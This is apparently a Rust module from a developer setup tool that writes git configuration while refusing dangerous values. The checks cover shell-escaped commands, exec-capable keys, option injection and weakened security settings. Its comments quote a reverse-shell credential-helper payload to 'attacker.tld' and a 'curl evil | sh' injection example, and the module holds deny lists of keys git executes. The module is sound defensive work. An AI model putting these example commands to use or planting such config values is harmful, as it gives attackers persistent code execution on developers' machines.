//! Git configuration setup - applies git config settings

use std::path::{Path, PathBuf};
use std::process::Command;

use thiserror::Error;

use super::config::{ConfigScope, GitConfig, SigningFormat};

/// Parse a Jarvy boolean opt-in/opt-out environment variable. Accepts `1` /
/// `true` / `yes` (case-insensitive) as enabled; everything else — including
/// unset — is disabled. Canonical spelling set for the git-config security
/// opt-outs in THIS module (`JARVY_ALLOW_SHELL_ALIASES`,
/// `JARVY_ALLOW_GIT_PROTECT_DOWNGRADE`, `JARVY_ALLOW_GIT_EXEC_KEYS`). NOTE: other
/// `JARVY_ALLOW_*` gates (`src/network/propagate.rs`, `src/env/secrets.rs`,
/// `src/update/signature.rs`) still parse independently and have drifted
/// (e.g. `secrets.rs` is case-sensitive) — promoting this to a shared
/// `crate::env` helper is a tracked follow-up, not done here to avoid changing
/// those modules' behavior.
fn env_flag_enabled(name: &str) -> bool {
    std::env::var(name)
        .map(|v| v == "1" || v.eq_ignore_ascii_case("true") || v.eq_ignore_ascii_case("yes"))
        .unwrap_or(false)
}

// Emit a `git_config.*` tracing event ONLY when telemetry is enabled — the gate
// that keeps these events from shipping to OTLP against a `telemetry.enabled =
// false` opt-out. Macros (not fns) so structured `event=…, k=v` fields forward
// cleanly; a fn wrapper cannot. Centralizing the guard means no new git_config
// event can silently bypass the opt-out (the exact class of bug CLAUDE.md
// records as a prior P0). Refusals are also surfaced to the user via the
// returned `Err` → stderr, so gating them costs no user-facing signal.
macro_rules! gated_warn {
    ($($t:tt)*) => {
        if crate::observability::telemetry_gate::is_enabled() {
            tracing::warn!($($t)*);
        }
    };
}
macro_rules! gated_info {
    ($($t:tt)*) => {
        if crate::observability::telemetry_gate::is_enabled() {
            tracing::info!($($t)*);
        }
    };
}
macro_rules! gated_debug {
    ($($t:tt)*) => {
        if crate::observability::telemetry_gate::is_enabled() {
            tracing::debug!($($t)*);
        }
    };
}

/// Cross-platform recommended git defaults applied by `os_defaults` (not
/// OS-specific, but sane for most repos and cheap to reverse).
/// `merge.conflictStyle = zdiff3` needs git >= 2.35; older git ignores the
/// unknown style at merge time rather than erroring on write.
const RECOMMENDED_DEFAULTS: &[(&str, &str)] = &[
    ("fetch.prune", "true"),           // drop refs deleted on the remote
    ("rerere.enabled", "true"),        // reuse recorded conflict resolutions
    ("merge.conflictStyle", "zdiff3"), // show the common base in conflicts
];

/// Errors that can occur during git configuration
#[derive(Debug, Error)]
pub enum GitError {
    #[error("Failed to set git config '{0}': {1}")]
    ConfigFailed(String, String),

    #[error("Git command failed: {0}")]
    CommandFailed(#[from] std::io::Error),

    #[error("Git not installed")]
    GitNotInstalled,

    #[error("Signing key not found: {0}")]
    #[allow(dead_code)] // Reserved for future validation
    SigningKeyNotFound(String),

    /// A `[git]` config value was refused because git would interpret it as a
    /// shell command. The classic exploit:
    ///
    ///   [git]
    ///   credential_helper = "!nc attacker.tld 4444 -e /bin/sh"
    ///
    /// Git's `!`-prefix syntax executes the value as a shell command on every
    /// `git push` / `git commit`, persisting RCE outside Jarvy's control window.
    /// We refuse `!`-prefixed values for the security-sensitive keys
    /// (`credential.helper`, `core.editor`, `core.pager`, `core.sshCommand`)
    /// and for any `alias.*` unless `JARVY_ALLOW_SHELL_ALIASES=1` is set.
    #[error("Refused dangerous git config '{0}': {1}")]
    RefusedDangerousConfig(String, String),

    /// A `[git.extra]` key was rejected before reaching `git config`. Keys are
    /// free-form, so a malformed or hostile config could otherwise pass a value
    /// that git parses as an option (e.g. `--global`, `-f`) rather than a
    /// config key. See `validate_extra_key` for the grammar we enforce.
    #[error("Invalid git config key '{0}': {1}")]
    InvalidConfigKey(String, String),
}

impl GitError {
    /// Bounded, low-cardinality label for telemetry (`git_config.phase_completed`
    /// `error_kind`) so a failed phase is categorizable (git-missing vs. refusal
    /// vs. write-fail vs. IO) without shipping free-text.
    #[must_use]
    pub fn kind(&self) -> &'static str {
        match self {
            GitError::ConfigFailed(..) => "write_failed",
            GitError::CommandFailed(_) => "io",
            GitError::GitNotInstalled => "git_not_installed",
            GitError::SigningKeyNotFound(_) => "signing_key_not_found",
            GitError::RefusedDangerousConfig(..) => "refused",
            GitError::InvalidConfigKey(..) => "invalid_key",
        }
    }
}

/// Validate a free-form `[git.extra]` key before handing it to `git config`.
///
/// git parses options anywhere on its command line, so a key like `--global`
/// or `-f` in the key position could change the command's meaning. We require
/// the canonical dotted grammar and reject anything that could be read as a
/// flag. Enforced rules:
/// - non-empty, ≤ 256 bytes
/// - ASCII only; every char in `[A-Za-z0-9._-]`
/// - must not start with `-` (flag-injection guard)
/// - at least one `.` (git config keys are always `section.key`)
/// - no leading/trailing `.` and no empty `..` segment
fn validate_extra_key(key: &str) -> Result<(), GitError> {
    let invalid = |reason: &str| {
        Err(GitError::InvalidConfigKey(
            key.to_string(),
            reason.to_string(),
        ))
    };

    if key.is_empty() {
        return invalid("key is empty");
    }
    if key.len() > 256 {
        return invalid("key exceeds 256 bytes");
    }
    if key.starts_with('-') {
        return invalid("key must not start with '-' (would be parsed as a git option)");
    }
    if !key.contains('.') {
        return invalid("git config keys must be dotted, e.g. `section.key`");
    }
    if key.starts_with('.') || key.ends_with('.') || key.contains("..") {
        return invalid("key has an empty section or subsection segment");
    }
    if !key
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b'_')
    {
        return invalid("key contains characters outside [A-Za-z0-9._-]");
    }
    Ok(())
}

/// Refuse `[git.extra]` values that weaken a git security guardrail. Each of
/// these keys defends against a known attack class; setting it the wrong way
/// re-opens the hole, so we reject the weakening direction unless
/// `JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1` is set. Non-matching keys pass through.
///
/// - `core.protectNTFS` / `core.protectHFS` = falsey → re-enables `.git`-path
///   smuggling (NTFS 8.3 short-names, HFS+ ignorable code points). Default on.
/// - `safe.directory = *` → disables repository-ownership verification wholesale
///   (CVE-2022-24765). A specific path is fine; the `*` wildcard is not.
/// - `safe.bareRepository = all` → re-enables embedded bare-repo attacks
///   (git 2.38 hardening, CVE-2022-24765 sibling).
/// - `fsck.<id>` / `fetch.fsck.<id>` / `receive.fsck.<id>` = `ignore`, or
///   `transfer`/`fetch`/`receive.fsckObjects` = falsey → silences object-
///   integrity validation. `warn` / `error` are allowed; `ignore`/off is the
///   dangerous setting.
/// - `http[.<url>].sslVerify = false` → disables TLS certificate verification,
///   enabling MITM of `git fetch`/`push`.
///
/// When the env override is set, a would-be violation is still recorded via
/// `git_config.protect_downgrade_override_applied` so a deliberate bypass is
/// visible; otherwise it is refused.
fn check_not_protect_downgrade(key: &str, value: &str) -> Result<(), GitError> {
    let Some((guardrail, reason)) = protect_downgrade_violation(key, value) else {
        return Ok(());
    };

    if env_flag_enabled("JARVY_ALLOW_GIT_PROTECT_DOWNGRADE") {
        gated_warn!(
            event = "git_config.protect_downgrade_override_applied",
            key = %key,
            guardrail,
            "applied a `[git.extra]` guardrail downgrade under JARVY_ALLOW_GIT_PROTECT_DOWNGRADE"
        );
        return Ok(());
    }

    gated_warn!(
        event = "git_config.protect_downgrade_refused",
        key = %key,
        guardrail,
        "refused `[git.extra]` value that weakens a git security guardrail"
    );
    Err(GitError::RefusedDangerousConfig(
        key.to_string(),
        reason.to_string(),
    ))
}

/// Pure classifier: returns `(guardrail-label, human-reason)` if `(key, value)`
/// weakens a git security guardrail, else `None`. Separated from
/// `check_not_protect_downgrade` so it is unit-testable without env/telemetry.
fn protect_downgrade_violation(key: &str, value: &str) -> Option<(&'static str, &'static str)> {
    let trimmed = value.trim();
    let is_falsey = matches!(
        trimmed.to_ascii_lowercase().as_str(),
        "false" | "0" | "no" | "off" | ""
    );
    let is_ignore = trimmed.eq_ignore_ascii_case("ignore");
    let key_lower = key.to_ascii_lowercase();

    match key_lower.as_str() {
        "core.protectntfs" | "core.protecthfs" if is_falsey => Some((
            "protect_ntfs_hfs",
            "disabling core.protectNTFS/protectHFS re-opens `.git` path-smuggling attacks; \
             set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1 to override",
        )),
        "safe.directory" if trimmed == "*" => Some((
            "safe_directory_wildcard",
            "`safe.directory = *` disables repo-ownership verification (CVE-2022-24765); \
             pin a specific path instead, or set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1",
        )),
        // "safe.bareRepository".to_ascii_lowercase() == "safe.barerepository"
        "safe.barerepository" if trimmed.eq_ignore_ascii_case("all") => Some((
            "safe_bare_repository",
            "`safe.bareRepository = all` re-enables embedded bare-repo attacks; \
             set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1 to override",
        )),
        "transfer.fsckobjects" | "fetch.fsckobjects" | "receive.fsckobjects" if is_falsey => {
            Some((
                "fsck_objects_disabled",
                "disabling *.fsckObjects turns off object-integrity checking on transfer; \
             set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1 to override",
            ))
        }
        _ if is_ignore
            && (key_lower.starts_with("fsck.")
                || key_lower.starts_with("fetch.fsck.")
                || key_lower.starts_with("receive.fsck.")) =>
        {
            Some((
                "fsck_ignore",
                "setting an fsck check to `ignore` silences object-integrity validation; \
                 use `warn`/`error`, or set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1",
            ))
        }
        // http.sslVerify / http.<url>.sslVerify = false → TLS MITM.
        _ if is_falsey && key_lower.ends_with(".sslverify") => Some((
            "tls_verify_disabled",
            "disabling http.sslVerify turns off TLS certificate verification (MITM risk); \
             set JARVY_ALLOW_GIT_PROTECT_DOWNGRADE=1 to override",
        )),
        _ => None,
    }
}

/// Git config keys whose values git interprets as shell commands when the
/// value begins with `!`. A malicious `jarvy.toml` can use any of these to
/// stage persistent RCE on every `git push` / `git commit`.
const GIT_SHELL_INTERPRETED_KEYS: &[&str] = &[
    "credential.helper",
    "core.editor",
    "core.pager",
    "core.sshCommand",
    // sequence.editor, mergetool/difftool also accept ! values; keep narrow
    // for now and grow if a real user pattern needs it.
];

/// Returns true if the given value would be executed as a shell command by
/// git when stored under one of the shell-interpreted config keys.
fn value_is_shell_escape(value: &str) -> bool {
    // Git treats values starting with `!` as shell. It also strips leading
    // whitespace from config values on read, so `" !cmd"` is still a shell
    // value — match after trimming to close that bypass.
    value.trim_start().starts_with('!')
}

/// Shell metacharacters that turn a value git runs through `sh -c` (e.g.
/// `core.editor`, `core.pager`, `core.sshCommand`) into a command-injection
/// vector. A bare command plus flags (`code --wait`, `/usr/bin/vim`) contains
/// none of these; `vim; curl evil | sh` or `x$(evil)` does. Used to guard the
/// *typed* fields (`editor`, `credential_helper`) whose whole purpose is to set
/// such a key, so an outright refusal (as `[git.extra]` does) is not an option.
fn value_has_shell_metachars(value: &str) -> bool {
    value.contains(|c| {
        matches!(
            c,
            ';' | '|' | '&' | '$' | '`' | '(' | ')' | '<' | '>' | '\n' | '\r'
        )
    })
}

/// A `credential.helper` value whose first token is a path (absolute, relative,
/// or `~`-expanded) makes git execute an arbitrary program rather than the
/// `git-credential-<name>` shim. Bare-name helpers (`osxkeychain`, `cache`,
/// `manager-core`, `store --file=…`) are safe; a path is not. Checks only the
/// first whitespace-delimited token so `cache --timeout=…` / `store --file=/x`
/// stay allowed.
fn credential_helper_is_program_path(value: &str) -> bool {
    let first = value.split_whitespace().next().unwrap_or("");
    first.starts_with('/')
        || first.starts_with('.')
        || first.starts_with('~')
        || first.contains('/')
}

/// Parse `git config --list --null` output into a `key -> value` map, keeping
/// only keys present in `want` (git lower-cases keys in `--list`, so `want`
/// must hold lowercase keys). Pure — unit-testable without shelling out.
/// `--null` format: each record is `key\nvalue`, records separated by NUL; an
/// empty value renders as `key\n` (no value after the newline).
fn parse_null_config(
    stdout: &[u8],
    want: &std::collections::HashSet<String>,
) -> std::collections::HashMap<String, String> {
    String::from_utf8_lossy(stdout)
        .split('\0')
        .filter(|s| !s.is_empty())
        .filter_map(|record| {
            let mut it = record.splitn(2, '\n');
            let key = it.next()?;
            if !want.contains(key) {
                return None;
            }
            let value = it.next().unwrap_or("");
            Some((key.to_string(), value.to_string()))
        })
        .collect()
}

/// Filter an `os_default_plan` down to the entries whose current value does NOT
/// already match `existing` (git-lowercased keys), i.e. the writes that would
/// actually change something. Pure — the testable core of the idempotent-re-run
/// skip in `configure_os_defaults`.
fn os_defaults_to_write<'a>(
    plan: &[(&'a str, &'a str)],
    existing: &std::collections::HashMap<String, String>,
) -> Vec<(&'a str, &'a str)> {
    plan.iter()
        .filter(|(k, v)| existing.get(&k.to_ascii_lowercase()).map(String::as_str) != Some(*v))
        .copied()
        .collect()
}

/// Git config keys whose VALUE git executes with no `!` marker required —
/// either run through the shell verbatim (`core.pager`, `core.editor`,
/// `core.sshCommand`, `sequence.editor`, `diff.external`) or invoked as a
/// program / hook directory (`core.fsmonitor`, `core.hooksPath`,
/// `credential.helper`, `gpg.program`). Because they need no marker character,
/// the `!`-only filter does not catch them, so `[git.extra]` refuses these
/// OUTRIGHT (any value) unless `JARVY_ALLOW_GIT_EXEC_KEYS=1`. Stored lowercase
/// for case-insensitive matching. Wildcard families (`filter.<n>.clean`,
/// `<n>.textconv`, `mergetool.<n>.cmd`, `gpg.<fmt>.program`) are handled in
/// `is_exec_capable_key` since git allows arbitrary subsection names there.
const EXEC_CAPABLE_KEYS: &[&str] = &[
    "core.pager",
    "core.editor",
    "core.sshcommand",
    "core.askpass",
    "core.fsmonitor",
    "core.hookspath",
    "sequence.editor",
    "diff.external",
    "credential.helper",
    "gpg.program",
    "uploadpack.packobjectshook",
    "init.templatedir", // seeds hooks into new repos → deferred exec
];

/// True if `key` (case-insensitively) names a git config entry whose value git
/// will execute — either a fixed `EXEC_CAPABLE_KEYS` entry or a member of a
/// wildcard family whose subsection is attacker-chosen.
fn is_exec_capable_key(key: &str) -> bool {
    let k = key.to_ascii_lowercase();
    if EXEC_CAPABLE_KEYS.contains(&k.as_str()) {
        return true;
    }
    // filter.<name>.{clean,smudge,process}
    (k.starts_with("filter.")
        && (k.ends_with(".clean") || k.ends_with(".smudge") || k.ends_with(".process")))
        // diff.<name>.textconv (and any *.textconv driver)
        || k.ends_with(".textconv")
        // mergetool.<name>.cmd / difftool.<name>.cmd
        || ((k.starts_with("mergetool.") || k.starts_with("difftool.")) && k.ends_with(".cmd"))
        // gpg.<format>.program (e.g. gpg.ssh.program)
        || (k.starts_with("gpg.") && k.ends_with(".program"))
        // pager.<cmd> per-command pagers (pager.log, pager.diff, …) — core.pager
        // is already listed; the bare `pager` key is not a thing.
        || (k.starts_with("pager.") && k.len() > "pager.".len())
        // merge.<driver>.driver — custom merge driver run when .gitattributes selects it
        || (k.starts_with("merge.") && k.ends_with(".driver"))
        // remote.<name>.{uploadpack,receivepack} — executed for local/file remotes
        || (k.starts_with("remote.") && (k.ends_with(".uploadpack") || k.ends_with(".receivepack")))
}

/// A few exec-capable keys have a safe subset of values that should still be
/// allowed via `[git.extra]`. `core.fsmonitor` is the notable case: `true` /
/// `false` toggle git's *builtin* file-system monitor (no program run), while
/// any other value is a program path git executes. Returns true only for those
/// known-safe (key, value) combinations; everything else stays refused.
fn exec_key_value_is_safe(key: &str, value: &str) -> bool {
    let v = value.trim();
    match key.to_ascii_lowercase().as_str() {
        "core.fsmonitor" => v.eq_ignore_ascii_case("true") || v.eq_ignore_ascii_case("false"),
        _ => false,
    }
}

/// Git setup handler
pub struct GitSetup {
    config: GitConfig,
    project_dir: Option<PathBuf>,
    quiet: bool,
}

impl GitSetup {
    /// Create a new GitSetup with the given configuration
    pub fn new(config: GitConfig) -> Self {
        Self {
            config,
            project_dir: None,
            quiet: false,
        }
    }

    /// Set the project directory for local scope configurations
    #[allow(dead_code)] // Builder pattern for advanced usage
    pub fn with_project_dir(mut self, dir: PathBuf) -> Self {
        self.project_dir = Some(dir);
        self
    }

    /// Set quiet mode (suppress output)
    #[allow(dead_code)] // Builder pattern for quiet mode
    pub fn quiet(mut self, quiet: bool) -> Self {
        self.quiet = quiet;
        self
    }

    /// Check if git is installed
    pub fn check_git_installed() -> Result<(), GitError> {
        let output = Command::new("git").arg("--version").output()?;

        if !output.status.success() {
            return Err(GitError::GitNotInstalled);
        }
        Ok(())
    }

    /// Apply all git configuration settings
    pub fn configure(&self) -> Result<(), GitError> {
        Self::check_git_installed()?;

        // Configure identity
        self.configure_identity()?;

        // Configure signing if enabled
        if self.config.signing {
            self.configure_signing()?;
        }

        // Configure defaults
        self.configure_defaults()?;

        // Configure editor
        if let Some(ref editor) = self.config.editor {
            self.set_config("core.editor", editor)?;
        }

        // Configure line endings
        self.configure_line_endings()?;

        // Configure credential helper
        self.configure_credential_helper()?;

        // Apply OS-aware defaults for keys the user left unset (autocrlf,
        // Windows longpaths, macOS precomposeunicode). Before aliases/extra so
        // `[git.extra]` still wins.
        self.configure_os_defaults()?;

        // Configure aliases
        self.configure_aliases()?;

        // Apply free-form escape-hatch keys last so they can override any
        // modeled field targeting the same git config key.
        self.configure_extra()?;

        Ok(())
    }

    /// The `[git.extra]` entries, sorted, that would be written — after running
    /// the full guard gauntlet on each. Returns `Err` on the first key that is
    /// refused (matching `configure_extra`'s fail-fast), so the dry-run preview
    /// shows exactly what a real run would do (preview == apply). One producer
    /// consumed by both `configure_extra` (write) and the dry-run block.
    pub(crate) fn extra_write_plan(&self) -> Result<Vec<(String, String)>, GitError> {
        let allow_exec_keys = env_flag_enabled("JARVY_ALLOW_GIT_EXEC_KEYS");
        let mut entries: Vec<(&String, &String)> = self.config.extra.iter().collect();
        entries.sort_by(|a, b| a.0.cmp(b.0));

        let mut plan = Vec::with_capacity(entries.len());
        for (key, value) in entries {
            self.check_extra_entry(key, value, allow_exec_keys)?;
            plan.push((key.clone(), value.clone()));
        }
        Ok(plan)
    }

    /// Run one `[git.extra]` entry through the layered guard gauntlet WITHOUT
    /// writing it. `Ok(())` means the entry would be written; `Err` is the
    /// refusal (with its gated warn already emitted). Steps: grammar/flag
    /// validation → leading-`-` value (argv option-injection) → exec-capable key
    /// (RCE the `!` filter can't cover; `JARVY_ALLOW_GIT_EXEC_KEYS` overrides,
    /// and records `exec_key_override_applied`) → guardrail-downgrade →
    /// `!`-shell value (defense-in-depth for keys reachable via `set_config`).
    fn check_extra_entry(
        &self,
        key: &str,
        value: &str,
        allow_exec_keys: bool,
    ) -> Result<(), GitError> {
        // 1. Key grammar / flag-injection (`--global`, `-f`, control bytes).
        if let Err(e) = validate_extra_key(key) {
            gated_warn!(
                event = "git_config.refused_invalid_key",
                key = %key,
                "rejected `[git.extra]` key (grammar / flag-injection guard)"
            );
            return Err(e);
        }
        // 2. Leading-`-` value → git parses it as an option, not data.
        if value.starts_with('-') {
            gated_warn!(
                event = "git_config.refused_option_value",
                key = %key,
                "refused `[git.extra]` value starting with `-` (git would parse it as an option)"
            );
            return Err(GitError::RefusedDangerousConfig(
                key.to_string(),
                "values starting with `-` are parsed by git as an option, not data; \
                 refusing to set this from `[git.extra]`"
                    .to_string(),
            ));
        }
        // 3. Keys whose value git executes with no marker (RCE sink).
        if is_exec_capable_key(key) && !exec_key_value_is_safe(key, value) {
            if allow_exec_keys {
                gated_warn!(
                    event = "git_config.exec_key_override_applied",
                    key = %key,
                    "applied a `[git.extra]` exec-capable key under JARVY_ALLOW_GIT_EXEC_KEYS"
                );
            } else {
                gated_warn!(
                    event = "git_config.exec_key_refused",
                    key = %key,
                    "refused `[git.extra]` key whose value git executes (set JARVY_ALLOW_GIT_EXEC_KEYS=1 to allow)"
                );
                return Err(GitError::RefusedDangerousConfig(
                    key.to_string(),
                    "this git config key executes its value (shell command / program / hook path); \
                     refusing to set it from `[git.extra]` — set JARVY_ALLOW_GIT_EXEC_KEYS=1 to override"
                        .to_string(),
                ));
            }
        }
        // 4. Values that weaken a security guardrail.
        check_not_protect_downgrade(key, value)?;
        // 5. `!`-shell values (defense-in-depth).
        if value_is_shell_escape(value) {
            gated_warn!(
                event = "git_config.shell_escape_refused",
                key = %key,
                "refused `[git.extra]` value starting with `!` (git would run it as a shell command)"
            );
            return Err(GitError::RefusedDangerousConfig(
                key.to_string(),
                "values starting with `!` are interpreted by git as a shell command; \
                 refusing to set this from `[git.extra]` in jarvy.toml"
                    .to_string(),
            ));
        }
        Ok(())
    }

    /// Apply free-form `[git.extra]` keys. Runs each through `check_extra_entry`,
    /// then `set_config`, emitting a per-key breadcrumb after each successful
    /// write (so a partial failure still leaves an audit trail) and a summary
    /// once complete. All breadcrumbs redact to section-prefixes + counts only.
    fn configure_extra(&self) -> Result<(), GitError> {
        if self.config.extra.is_empty() {
            return Ok(());
        }
        let plan = self.extra_write_plan()?;
        for (key, value) in &plan {
            self.set_config(key, value)?;
            // Per-key trail (section prefix only) so a mid-loop abort still
            // records what was already written to gitconfig.
            gated_debug!(
                event = "git_config.extra_key_applied",
                section = %key.split('.').next().unwrap_or("")
            );
        }

        // Summary breadcrumb: section prefixes + count only — never values, and
        // never full keys (a `branch.<name>.*` subsection can embed a name).
        let mut sections: Vec<&str> = plan
            .iter()
            .filter_map(|(k, _)| k.split('.').next())
            .collect();
        sections.sort_unstable();
        sections.dedup();
        gated_info!(
            event = "git_config.extra_applied",
            key_count = plan.len(),
            sections = %sections.join(",")
        );
        Ok(())
    }

    /// Configure user identity (name and email)
    fn configure_identity(&self) -> Result<(), GitError> {
        if let Some(ref name) = self.config.user_name
            && let Some(value) = name.resolve()
        {
            self.set_config("user.name", &value)?;
        }

        if let Some(ref email) = self.config.user_email
            && let Some(value) = email.resolve()
        {
            self.set_config("user.email", &value)?;
        }

        Ok(())
    }

    /// Configure commit signing
    fn configure_signing(&self) -> Result<(), GitError> {
        self.set_config("commit.gpgsign", "true")?;

        if let Some(ref key) = self.config.signing_key {
            // Expand tilde in path
            let key_path = shellexpand::tilde(key);

            // Auto-detect format if not specified
            let format = self.config.signing_format.unwrap_or_else(|| {
                if key_path.ends_with(".pub") {
                    SigningFormat::Ssh
                } else {
                    SigningFormat::Gpg
                }
            });

            match format {
                SigningFormat::Ssh => {
                    self.set_config("gpg.format", "ssh")?;
                    self.set_config("user.signingkey", &key_path)?;
                }
                SigningFormat::Gpg => {
                    self.set_config("user.signingkey", &key_path)?;
                }
            }
        }

        Ok(())
    }

    /// Configure default settings (branch, pull strategy, etc.)
    fn configure_defaults(&self) -> Result<(), GitError> {
        if let Some(ref branch) = self.config.default_branch {
            self.set_config("init.defaultBranch", branch)?;
        }

        if self.config.pull_rebase {
            self.set_config("pull.rebase", "true")?;
        }

        if self.config.auto_stash {
            self.set_config("rebase.autoStash", "true")?;
        }

        if self.config.push_autosetup {
            self.set_config("push.autoSetupRemote", "true")?;
        }

        Ok(())
    }

    /// The `core.autocrlf` value appropriate for the host OS: Windows checks
    /// out CRLF and commits LF (`true`); Unix commits LF untouched (`input`).
    fn os_default_autocrlf() -> &'static str {
        if cfg!(target_os = "windows") {
            "true"
        } else {
            "input"
        }
    }

    /// The `(key, value)` git-config defaults this run would apply, in order,
    /// given the current config and host OS — the pure DECISION, no I/O, so it
    /// is unit-testable without shelling out to `git config`. Returns empty when
    /// `os_defaults = false`. A key already present in `[git.extra]`, or (for
    /// `core.autocrlf`) set as a typed field, is omitted so explicit values win.
    pub(crate) fn os_default_plan(&self) -> Vec<(&'static str, &'static str)> {
        if !self.config.os_defaults.unwrap_or(true) {
            return Vec::new();
        }
        let not_in_extra = |key: &str| !self.config.extra.contains_key(key);
        let mut plan: Vec<(&'static str, &'static str)> = Vec::new();

        // Line endings: only when `autocrlf` is unset AND not steered via extra.
        if self.config.autocrlf.is_none() && not_in_extra("core.autocrlf") {
            plan.push(("core.autocrlf", Self::os_default_autocrlf()));
        }
        // Windows: allow paths longer than the 260-char MAX_PATH limit.
        #[cfg(target_os = "windows")]
        if not_in_extra("core.longpaths") {
            plan.push(("core.longpaths", "true"));
        }
        // macOS: recompose APFS/HFS+ NFD filenames to NFC for cross-platform matches.
        #[cfg(target_os = "macos")]
        if not_in_extra("core.precomposeunicode") {
            plan.push(("core.precomposeunicode", "true"));
        }
        for (key, value) in RECOMMENDED_DEFAULTS {
            if not_in_extra(key) {
                plan.push((key, value));
            }
        }
        plan
    }

    /// Apply OS-appropriate git config defaults for keys the user didn't set
    /// explicitly. Mirrors the always-on per-OS `credential.helper` default.
    /// The decision lives in `os_default_plan`; this applies it, skipping keys
    /// whose current value already matches (so idempotent re-runs don't re-fork
    /// `git config`) and logging each key only *after* its write succeeds.
    fn configure_os_defaults(&self) -> Result<(), GitError> {
        let enabled = self.config.os_defaults.unwrap_or(true);
        let plan = self.os_default_plan();

        let mut written = 0usize;
        if !plan.is_empty() {
            // One read up front (only the keys we might write) instead of an
            // unconditional fork per key.
            let want: std::collections::HashSet<String> =
                plan.iter().map(|(k, _)| k.to_ascii_lowercase()).collect();
            let existing = self.existing_config(&want);
            for (key, value) in os_defaults_to_write(&plan, &existing) {
                self.set_config(key, value)?;
                gated_debug!(
                    event = "git_config.os_default_key_applied",
                    key = %key,
                    value = %value
                );
                written += 1;
            }
        }

        gated_info!(
            event = "git_config.os_defaults_applied",
            enabled,
            opted_out = !enabled,
            keys_written = written
        );
        Ok(())
    }

    /// Snapshot the current git config for this scope, keeping only the keys in
    /// `want` (lowercase — git lower-cases keys in `--list`). Best-effort: any
    /// error yields an empty map, so callers fall back to writing unconditionally
    /// (prior behavior). Parsing is delegated to the pure `parse_null_config`.
    fn existing_config(
        &self,
        want: &std::collections::HashSet<String>,
    ) -> std::collections::HashMap<String, String> {
        let scope_flag = match self.config.scope {
            ConfigScope::Global => "--global",
            ConfigScope::Local => "--local",
        };
        let mut cmd = Command::new("git");
        cmd.args(["config", scope_flag, "--list", "--null"]);
        if let Some(ref dir) = self.project_dir {
            cmd.current_dir(dir);
        }
        let Ok(output) = cmd.output() else {
            return std::collections::HashMap::new();
        };
        if !output.status.success() {
            return std::collections::HashMap::new();
        }
        parse_null_config(&output.stdout, want)
    }

    /// Configure line ending settings
    fn configure_line_endings(&self) -> Result<(), GitError> {
        if let Some(ref autocrlf) = self.config.autocrlf {
            self.set_config("core.autocrlf", autocrlf.as_str())?;
        }

        if let Some(ref eol) = self.config.eol {
            self.set_config("core.eol", eol)?;
        }

        Ok(())
    }

    /// Configure credential helper (auto-detect based on OS if not specified)
    fn configure_credential_helper(&self) -> Result<(), GitError> {
        let helper = self
            .config
            .credential_helper
            .as_deref()
            .unwrap_or_else(|| Self::default_credential_helper());

        self.set_config("credential.helper", helper)?;
        Ok(())
    }

    /// Configure git aliases
    fn configure_aliases(&self) -> Result<(), GitError> {
        for (alias, command) in &self.config.aliases {
            self.set_config(&format!("alias.{alias}"), command)?;
        }
        Ok(())
    }

    /// Set a single git config value.
    ///
    /// This is the funnel for EVERY write, including the typed `editor` /
    /// `credential_helper` fields — which map to shell-interpreted keys git
    /// executes. `[git.extra]` refuses exec-capable keys outright, but the typed
    /// fields exist precisely to set `core.editor` / `credential.helper`, so
    /// here we refuse only the dangerous VALUE forms: a `!`-shell value, an
    /// injected shell metacharacter, or (for `credential.helper`) a program
    /// path. A bare command plus flags (`vim`, `code --wait`, `osxkeychain`,
    /// `cache --timeout=…`) is allowed. `JARVY_ALLOW_GIT_EXEC_KEYS=1` overrides.
    fn set_config(&self, key: &str, value: &str) -> Result<(), GitError> {
        let is_shell_key = GIT_SHELL_INTERPRETED_KEYS.contains(&key);
        if is_shell_key {
            let unsafe_value = value_is_shell_escape(value)
                || value_has_shell_metachars(value)
                || (key == "credential.helper" && credential_helper_is_program_path(value));
            if unsafe_value && !env_flag_enabled("JARVY_ALLOW_GIT_EXEC_KEYS") {
                gated_warn!(
                    event = "git_config.exec_value_refused",
                    key = %key,
                    "refused a value git would execute for a shell-interpreted key (`!` / shell \
                     metacharacter / program path); set JARVY_ALLOW_GIT_EXEC_KEYS=1 to allow"
                );
                return Err(GitError::RefusedDangerousConfig(
                    key.to_string(),
                    "this git config key executes its value; refusing a `!` / shell-metacharacter \
                     / program-path value — set JARVY_ALLOW_GIT_EXEC_KEYS=1 to override"
                        .to_string(),
                ));
            }
        }

        // `!`-prefixed aliases execute as shell on `git <alias>`; gated separately.
        if key.starts_with("alias.")
            && value_is_shell_escape(value)
            && !env_flag_enabled("JARVY_ALLOW_SHELL_ALIASES")
        {
            gated_warn!(
                event = "git_config.shell_alias_refused",
                alias = %key,
                "refused git alias starting with `!` (set JARVY_ALLOW_SHELL_ALIASES=1 to allow)"
            );
            return Err(GitError::RefusedDangerousConfig(
                key.to_string(),
                "git aliases starting with `!` execute as shell on `git <alias>`; \
                 set JARVY_ALLOW_SHELL_ALIASES=1 to allow"
                    .to_string(),
            ));
        }

        let scope_flag = match self.config.scope {
            ConfigScope::Global => "--global",
            ConfigScope::Local => "--local",
        };

        let mut cmd = Command::new("git");
        cmd.args(["config", scope_flag, key, value]);

        if let Some(ref dir) = self.project_dir {
            cmd.current_dir(dir);
        }

        let output = cmd.output()?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            // Bound the telemetry field: first line, ≤160 chars. git stderr can
            // embed the value or a filesystem path (username) and is unbounded,
            // so cap cardinality/PII while keeping enough to triage. The full
            // stderr still reaches the user via the returned `Err`.
            let error_brief: String = stderr
                .trim()
                .lines()
                .next()
                .unwrap_or("")
                .chars()
                .take(160)
                .collect();
            gated_warn!(
                event = "git_config.set_failed",
                key = %key,
                error_brief = %error_brief,
                "git config write failed"
            );
            return Err(GitError::ConfigFailed(key.to_string(), stderr.to_string()));
        }

        if !self.quiet {
            println!("  Set git config {key}: {value}");
        }

        Ok(())
    }

    /// Get the default credential helper for the current OS
    fn default_credential_helper() -> &'static str {
        #[cfg(target_os = "macos")]
        {
            "osxkeychain"
        }

        #[cfg(target_os = "linux")]
        {
            "cache"
        }

        #[cfg(target_os = "windows")]
        {
            "manager-core"
        }

